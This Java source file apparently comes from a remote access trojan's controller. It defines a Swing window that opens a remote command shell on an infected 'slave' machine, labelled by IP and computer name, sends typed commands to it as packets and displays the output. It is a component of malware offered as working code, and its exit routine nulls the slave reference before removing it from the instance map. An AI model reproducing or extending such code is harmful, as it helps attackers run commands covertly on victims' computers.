package com.redpois0n.ui.frames;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;

import com.redpois0n.Slave;
import com.redpois0n.packets.outgoing.Packet23RemoteShellStart;
import com.redpois0n.packets.outgoing.Packet24RemoteShellStop;
import com.redpois0n.packets.outgoing.Packet25RemoteShellExecute;


@SuppressWarnings("serial")
public class FrameRemoteShell extends BaseFrame {

	private JPanel contentPane;

	public static HashMap<Slave, FrameRemoteShell> instances = new HashMap<Slave, FrameRemoteShell>();
	public Slave slave;
	private JTextField txtCommand;
	public JTextPane textPane;

	public FrameRemoteShell(Slave slave) {
		super();
		setResizable(false);
		this.slave = slave;
		instances.put(slave, this);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteShell.class.getResource("/icons/cmd.png")));
		setTitle("Remote Shell - " + slave.getIP() + " - " + slave.getComputerName());
		final Slave sl = slave;
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 499, 302);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		txtCommand = new JTextField();
		txtCommand.addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent e) {
				if (e.getKeyCode() == KeyEvent.VK_ENTER && txtCommand.getText().trim().length() > 0) {
					String command = txtCommand.getText().trim();
					sl.addToSendQueue(new Packet25RemoteShellExecute(command));
					txtCommand.setText("");			
				}
			}
		});
		txtCommand.setColumns(10);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		textPane = new JTextPane();
		scrollPane.setViewportView(textPane);
		textPane.setEditable(false);
		textPane.setForeground(Color.WHITE);
		textPane.setBackground(Color.BLACK);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 485, GroupLayout.PREFERRED_SIZE)
				.addComponent(txtCommand, GroupLayout.PREFERRED_SIZE, 485, GroupLayout.PREFERRED_SIZE)
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 245, GroupLayout.PREFERRED_SIZE)
					.addGap(1)
					.addComponent(txtCommand, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
		);
		contentPane.setLayout(gl_contentPane);
		
		slave.addToSendQueue(new Packet23RemoteShellStart());
	}

	public void exit() {
		slave.addToSendQueue(new Packet24RemoteShellStop());
		slave = null;
		instances.remove(slave);
	}
}
